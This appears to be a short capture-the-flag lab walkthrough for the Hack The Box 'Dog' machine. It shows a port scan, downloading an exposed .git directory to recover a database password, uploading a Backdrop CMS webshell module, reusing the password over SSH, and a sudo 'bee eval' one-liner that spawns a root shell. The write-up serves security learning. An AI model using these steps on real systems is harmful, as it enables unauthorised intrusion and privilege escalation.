@@ -1,0 +1,227 @@
+<!doctype html>
+<html lang="en" data-accent="moss" data-f-ga4="G-ZMH6NLL7C7">
+<head>
+<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" /><script>try{var t=localStorage.getItem("facet-theme");if(/^(dark|light|auto)$/.test(t))document.documentElement.dataset.theme=t}catch(e){}</script>
+	<meta name="description" content="Hack The Box - Dog" />
+	<meta name="author" content="Shengtuo Hu" />
+	<meta name="theme-color" content="#13161c" media="(prefers-color-scheme: dark)" />
+	<meta name="theme-color" content="#f5f7f9" media="(prefers-color-scheme: light)" />
+	<title>Dog - nu1lptr</title>
+	<link rel="canonical" href="https://shengtuo.me/blog/htb/dog/" /><link rel="icon" href="https://shengtuo.me/favicon.ico" sizes="32x32" />
+	<link rel="icon" href="https://shengtuo.me/favicon.svg" type="image/svg+xml" />
+	<link rel="apple-touch-icon" href="https://shengtuo.me/apple-touch-icon.png" />
+	<link rel="alternate" type="application/rss+xml" title="nu1lptr - RSS Feed" href="https://shengtuo.me/rss.xml" />
+	<link rel="alternate" type="application/atom+xml" title="nu1lptr - Atom Feed" href="https://shengtuo.me/atom.xml" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/facet.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/cast/cast-layered.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/icons.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/giallo.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/css/site.css" />
+
+	<meta property="og:site_name" content="nu1lptr" /><meta property="og:title" content="Dog" />
+	<meta property="og:url" content="https://shengtuo.me/blog/htb/dog/" />
+	<meta property="og:description" content="Hack The Box - Dog" />
+	<meta property="og:image" content="https://shengtuo.me/cards/blog/htb/dog.png" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="article:published_time" content="2025-08-15T08:00:00-07:00" />
+	<meta property="article:author" content="Shengtuo Hu" />
+	<meta property="article:tag" content="HackTheBox" /><meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:title" content="Dog" />
+	<meta name="twitter:description" content="Hack The Box - Dog" />
+	<meta name="twitter:image" content="https://shengtuo.me/cards/blog/htb/dog.png" />
+	<meta name="twitter:site" content="@ShengtuoHu" />
+	<meta name="twitter:creator" content="@ShengtuoHu" /><script type="application/ld+json">
+{
+	"@context": "https://schema.org",
+	"@type": "BlogPosting",
+	"@id": "https://shengtuo.me/blog/htb/dog/#article",
+	"mainEntityOfPage": "https://shengtuo.me/blog/htb/dog/",
+	"url": "https://shengtuo.me/blog/htb/dog/",
+	"headline": "Dog",
+	"description": "Hack The Box - Dog",
+	"datePublished": "2025-08-15T08:00:00-07:00",
+	"dateModified": "2025-08-15T08:00:00-07:00",
+	"image": "https://shengtuo.me/cards/blog/htb/dog.png",
+	"keywords": ["HackTheBox"],
+	"inLanguage": "en",
+	"author": {
+		"@type": "Person",
+		"@id": "https://shengtuo.me/#person",
+		"name": "Shengtuo Hu",
+		"url": "https://shengtuo.me/"
+	},
+	"publisher": { "@id": "https://shengtuo.me/#person" }
+}
+</script>
+
+
+
+</head>
+<body>
+  <a class="f-visually-hidden" href="#main">Skip to content</a>
+  <nav class="f-nav f-nav--fixed" aria-label="Site">
+  <a class="f-nav__brand" href="https://shengtuo.me">nu1lptr</a>
+  <a href="https://shengtuo.me/blog/" aria-current="page">Blog</a>
+  <a href="https://shengtuo.me/projects/">Projects</a>
+  <a href="https://shengtuo.me/resume/">Resume</a>
+  <button class="f-btn f-btn--quiet site-search-open" type="button" aria-label="Search" title="Search (/)" hidden>
+    <svg class="site-search-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.5"/><path d="m15.5 15.5 5 5"/></svg>
+  </button>
+  <button class="f-theme-toggle" type="button" data-f-theme-toggle>Auto</button>
+</nav>
+
+  
+<main id="main" class="f-docs f-prose" data-f-code-ln="true" data-f-code-wrap="true" data-f-code-frame="false">
+  <nav class="f-toc" aria-label="On this page" data-f-scrollspy>
+  <p class="f-docs__label">On this page</p>
+  <a href="#port-scanning">Port Scanning</a>
+  <a href="#download-git-directory">Download Git Directory</a>
+  <a href="#webshell">Webshell</a>
+  <a href="#get-the-flag">Get the Flag</a>
+  <a href="#get-the-root-flag">Get the Root Flag</a>
+  <a href="#references">References</a>
+</nav>
+
+  <article class="site-post">
+<header class="f-reading__title">
+  <p class="f-kicker"><a href="https://shengtuo.me/blog/">nu1lptr&#39;s Blog</a></p>
+  <h1>Dog</h1>
+  <p class="f-meta site-post-meta">
+    <time datetime="2025-08-15">Aug 15, 2025</time> · 1 min read · <a href="https://shengtuo.me/tags/hackthebox/">HackTheBox</a> · <button class="f-btn f-btn--quiet site-share" type="button">Share</button><span class="site-share-status" role="status"></span>
+  </p>
+</header>
+
+    <ul>
+<li>Dog (Easy): <a rel="noopener external" target="_blank" href="https://www.hackthebox.com/machines/dog">https://www.hackthebox.com/machines/dog</a></li>
+<li>My notes: <a rel="noopener external" target="_blank" href="https://github.com/h1994st/HTB/blob/main/Dog/NOTES.md">https://github.com/h1994st/HTB/blob/main/Dog/NOTES.md</a></li>
+</ul>
+<h2 id="port-scanning"><a class="zola-anchor" href="#port-scanning" aria-label="Link to this section">#</a>
+Port Scanning</h2>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">sudo</span><span class="z-6"> nmap -vv -sC -sV -T4 -A</span><span class="z-3"> &lt;</span><span class="z-6">target I</span><span>P</span><span class="z-3">&gt;</span></span></code></pre>
+<p>Results:</p>
+<pre class="giallo z-code" data-lang="plain" data-wrap="false"><code data-lang="plain" data-wrap="false"><span class="giallo-l"><span>...</span></span>
+<span class="giallo-l"><span>PORT   STATE SERVICE REASON         VERSION</span></span>
+<span class="giallo-l"><span>22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)</span></span>
+<span class="giallo-l"><span>| ssh-hostkey:</span></span>
+<span class="giallo-l"><span>|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)</span></span>
+<span class="giallo-l"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=</span></span>
+<span class="giallo-l"><span>|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)</span></span>
+<span class="giallo-l"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=</span></span>
+<span class="giallo-l"><span>|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)</span></span>
+<span class="giallo-l"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc</span></span>
+<span class="giallo-l"><span>80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))</span></span>
+<span class="giallo-l"><span>| http-methods:</span></span>
+<span class="giallo-l"><span>|_  Supported Methods: GET HEAD</span></span>
+<span class="giallo-l"><span>| http-robots.txt: 22 disallowed entries</span></span>
+<span class="giallo-l"><span>| /core/ /profiles/ /README.md /web.config /admin</span></span>
+<span class="giallo-l"><span>| /comment/reply /filter/tips /node/add /search /user/register</span></span>
+<span class="giallo-l"><span>| /user/password /user/login /user/logout /?q=admin /?q=comment/reply</span></span>
+<span class="giallo-l"><span>| /?q=filter/tips /?q=node/add /?q=search /?q=user/password</span></span>
+<span class="giallo-l"><span>|_/?q=user/register /?q=user/login /?q=user/logout</span></span>
+<span class="giallo-l"><span>|_http-generator: Backdrop CMS 1 (https://backdropcms.org)</span></span>
+<span class="giallo-l"><span>| http-git:</span></span>
+<span class="giallo-l"><span>|   10.10.11.58:80/.git/</span></span>
+<span class="giallo-l"><span>|     Git repository found!</span></span>
+<span class="giallo-l"><span>|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...</span></span>
+<span class="giallo-l"><span>|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...</span></span>
+<span class="giallo-l"><span>|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510</span></span>
+<span class="giallo-l"><span>|_http-title: Home | Dog</span></span>
+<span class="giallo-l"><span>|_http-server-header: Apache/2.4.41 (Ubuntu)</span></span>
+<span class="giallo-l"><span>Device type: general purpose|router</span></span>
+<span class="giallo-l"><span>Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span></span>
+<span class="giallo-l"><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span></span>
+<span class="giallo-l"><span>OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span></span>
+<span class="giallo-l"><span>TCP/IP fingerprint:</span></span>
+<span class="giallo-l"><span>OS:SCAN(V=7.97%E=4%D=7/25%OT=22%CT=1%CU=32543%PV=Y%DS=2%DC=T%G=Y%TM=688435B</span></span>
+<span class="giallo-l"><span>OS:D%P=arm-apple-darwin24.4.0)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)</span></span>
+<span class="giallo-l"><span>OS:SEQ(SP=106%GCD=1%ISR=10B%TI=Z%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=</span></span>
+<span class="giallo-l"><span>OS:M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE</span></span>
+<span class="giallo-l"><span>OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=N)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5</span></span>
+<span class="giallo-l"><span>OS:52NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=4</span></span>
+<span class="giallo-l"><span>OS:0%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=</span></span>
+<span class="giallo-l"><span>OS:Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6</span></span>
+<span class="giallo-l"><span>OS:(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)T7(R=Y%DF=Y%T=40</span></span>
+<span class="giallo-l"><span>OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=</span></span>
+<span class="giallo-l"><span>OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)</span></span>
+<span class="giallo-l"><span>...</span></span></code></pre><h2 id="download-git-directory"><a class="zola-anchor" href="#download-git-directory" aria-label="Link to this section">#</a>
+Download Git Directory</h2>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">wget</span><span class="z-6"> -r -np -R</span><span class="z-3"> &quot;</span><span class="z-6">index.html*</span><span class="z-3">&quot;</span><span class="z-6"> http://10.10.11.58/.git</span></span></code></pre>
+<p>With <code>.git</code> directory, we can recover all files in the Git repo. From these files, we can find a database password in <code>settings.php</code>.</p>
+<h2 id="webshell"><a class="zola-anchor" href="#webshell" aria-label="Link to this section">#</a>
+Webshell</h2>
+<p>Try to upload a module to the target website. Here is the <a rel="noopener external" target="_blank" href="https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/download/backdrop/reference.tar">a Backdrop module</a> with Webshell.</p>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">tar</span><span class="z-6"> xf reference.tar</span></span></code></pre>
+<p>We can establish a reverse shell now, but there is a cleanup task running at the background. By inspecting <code>/etc/passwd</code> file or <code>/home</code> directory, we can find users on the target machine. Now, let's try the password in the setting to see if we can <code>ssh</code> into the machine.</p>
+<h2 id="get-the-flag"><a class="zola-anchor" href="#get-the-flag" aria-label="Link to this section">#</a>
+Get the Flag</h2>
+<p>After logining into the account, we can find a flag file in the user's home directory.</p>
+<pre class="giallo z-code" data-lang="plain" data-wrap="false"><code data-lang="plain" data-wrap="false"><span class="giallo-l"><span>johncusack@dog:~$ ls -alh</span></span>
+<span class="giallo-l"><span>total 28K</span></span>
+<span class="giallo-l"><span>drwxr-xr-x 3 johncusack johncusack 4.0K Feb  7  2025 .</span></span>
+<span class="giallo-l"><span>drwxr-xr-x 4 root       root       4.0K Aug 15  2024 ..</span></span>
+<span class="giallo-l"><span>lrwxrwxrwx 1 root       root          9 Feb  7  2025 .bash_history -&gt; /dev/null</span></span>
+<span class="giallo-l"><span>-rw-r--r-- 1 johncusack johncusack  220 Aug 15  2024 .bash_logout</span></span>
+<span class="giallo-l"><span>-rw-r--r-- 1 johncusack johncusack 3.7K Aug 15  2024 .bashrc</span></span>
+<span class="giallo-l"><span>drwx------ 2 johncusack johncusack 4.0K Aug 16  2024 .cache</span></span>
+<span class="giallo-l"><span>lrwxrwxrwx 1 root       root          9 Feb  7  2025 .mysql_history -&gt; /dev/null</span></span>
+<span class="giallo-l"><span>-rw-r--r-- 1 johncusack johncusack  807 Aug 15  2024 .profile</span></span>
+<span class="giallo-l"><span>-rw-r----- 1 root       johncusack   33 Aug 15 20:43 user.txt</span></span>
+<span class="giallo-l"><span>johncusack@dog:~$ cat user.txt</span></span>
+<span class="giallo-l"><span>08f688985833e8e5a42f0559c2ea7221</span></span></code></pre><h2 id="get-the-root-flag"><a class="zola-anchor" href="#get-the-root-flag" aria-label="Link to this section">#</a>
+Get the Root Flag</h2>
+<pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>johncusack@dog:~$ sudo -l</span></span>
+<span class="giallo-l"><span>[sudo] password for johncusack:</span></span>
+<span class="giallo-l"><span>Matching Defaults entries for johncusack on dog:</span></span>
+<span class="giallo-l"><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>User johncusack may run the following commands on dog:</span></span>
+<span class="giallo-l"><span>    (ALL : ALL) /usr/local/bin/bee</span></span></code></pre><pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>johncusack@dog:~$ sudo bee --root=/var/www/html eval &quot;system(&#39;bash&#39;)&quot;</span></span>
+<span class="giallo-l"><span>root@dog:/var/www/html# cd /root</span></span>
+<span class="giallo-l"><span>root@dog:~# ls</span></span>
+<span class="giallo-l"><span>root.txt</span></span>
+<span class="giallo-l"><span>root@dog:~# cat root.txt</span></span>
+<span class="giallo-l"><span>538167603e6b1517d85e06866c26551a</span></span></code></pre><h2 id="references"><a class="zola-anchor" href="#references" aria-label="Link to this section">#</a>
+References</h2>
+<ul>
+<li><a rel="noopener external" target="_blank" href="https://0xdf.gitlab.io/2025/07/12/htb-dog.html">HTB: Dog | 0xdf hacks stuff</a></li>
+</ul>
+
+    
+<nav class="site-prev-next" aria-label="More posts"><a href="https://shengtuo.me/blog/htb/twomillion/">← Older: TwoMillion</a><a href="https://shengtuo.me/blog/shell-upgrade/">Newer: Shell Upgrade →</a>
+</nav>
+
+  </article>
+</main>
+
+  <footer class="f-footer"><div class="f-footer__cats" aria-hidden="true"></div>
+  <ul class="f-social site-footer-social" aria-label="Elsewhere">
+    <li><a class="f-social__link" href="https://github.com/h1994st" rel="me noopener"><span class="f-icon f-icon--github" aria-hidden="true"></span><span class="f-visually-hidden">GitHub</span></a></li>
+    <li><a class="f-social__link" href="https://scholar.google.com/citations?user=VOefXMMAAAAJ" rel="me noopener"><span class="f-icon f-icon--google-scholar" aria-hidden="true"></span><span class="f-visually-hidden">Google Scholar</span></a></li>
+    <li><a class="f-social__link" href="https://www.linkedin.com/in/shengtuo/" rel="me noopener"><span class="f-icon f-icon--linkedin" aria-hidden="true"></span><span class="f-visually-hidden">LinkedIn</span></a></li>
+    <li><a class="f-social__link" href="https://x.com/ShengtuoHu" rel="me noopener"><span class="f-icon f-icon--x" aria-hidden="true"></span><span class="f-visually-hidden">X</span></a></li>
+    <li><a class="f-social__link" href="https://www.instagram.com/hst_nullderef/" rel="me noopener"><span class="f-icon f-icon--instagram" aria-hidden="true"></span><span class="f-visually-hidden">Instagram</span></a></li>
+  </ul>
+  <p class="site-footer-links"><a href="https://shengtuo.me/blog/">Blog</a> · <a href="https://shengtuo.me/notebook/">Notebook</a> · <a href="https://shengtuo.me/misc/">Misc.</a> · 
+    <a href="https://shengtuo.me/atom.xml">Feed</a>
+  </p>
+  <p>© 2026 Shengtuo Hu</p>
+</footer>
+
+  <dialog class="f-sheet" id="site-search" aria-label="Search" data-index="https://shengtuo.me/search_index.en.json">
+  <div class="f-sheet__panel">
+    <input class="f-input f-search" type="search" placeholder="Search posts and notes" aria-label="Search" autocomplete="off" />
+    <p class="f-meta site-search-status" role="status"></p>
+    <ol class="site-search-results"></ol>
+  </div>
+</dialog>
+<script type="module" src="https://shengtuo.me/js/site/search.js"></script>
+
+  
+  <script type="module" src="https://shengtuo.me/vendor/facet/dist/js/facet.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/cats.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/code-copy.js"></script><script type="module" src="https://shengtuo.me/js/site/share.js"></script>
+
+</body>
+</html>
